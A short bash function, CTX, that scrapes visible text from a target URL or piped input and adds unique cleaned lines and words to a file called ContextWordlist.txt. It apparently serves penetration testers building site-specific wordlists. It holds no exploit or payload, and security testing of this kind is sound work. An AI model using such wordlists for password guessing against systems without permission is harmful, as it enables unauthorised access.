CTX() {
  # Accepts a URL as an argument or text from stdin.
  # Appends both cleaned lines and individual words to ContextWordlist.txt.

  local URL="$1"
  local OUTFILE="ContextWordlist.txt"
  local TMPFILE=$(mktemp)    # Temporary file to store processed lines
  local WORDTMP=$(mktemp)    # Temporary file to store individual words

  # Show usage if no URL and no piped input
  if [ -t 0 ] && [ -z "$URL" ]; then
    echo "Usage:"
    echo "  CTX http://target:port/page        # Extract from a URL"
    echo "  curl http://target | html2text | CTX   # Extract from piped input"
    return 1
  fi

  # Check if input is from terminal (i.e., a URL) or from a pipe (stdin)
  if [ -t 0 ] && [ -n "$URL" ]; then
    echo "[*] Extracting visible text from $URL..."
    lynx -dump -nolist -width=999 "$URL" 2>/dev/null
  else
    # If piped input is detected, read from stdin instead
    cat -
  fi |
    # Clean special characters, remove leading spaces, keep only lines with words longer than 3 characters
    sed 's/[^a-zA-Z0-9 @.]/ /g' | sed 's/^ *//' | awk 'length > 3' > "$TMPFILE"

  # Break each line into individual words and save unique ones > 3 chars
  tr '[:space:]' '\n' < "$TMPFILE" | awk 'length > 3' | sort -u > "$WORDTMP"

  # If text was extracted, append both lines and words to output and deduplicate
  if [[ -s "$TMPFILE" ]]; then
    cat "$TMPFILE" >> "$OUTFILE"    # Append full cleaned lines
    cat "$WORDTMP" >> "$OUTFILE"    # Append extracted words
    sort -u "$OUTFILE" -o "$OUTFILE" # Deduplicate
    echo "[+] Context wordlist updated at $(realpath "$OUTFILE")"
  else
    echo "[!] No readable content extracted."
  fi

  # Cleanup
  rm -f "$TMPFILE" "$WORDTMP"
}




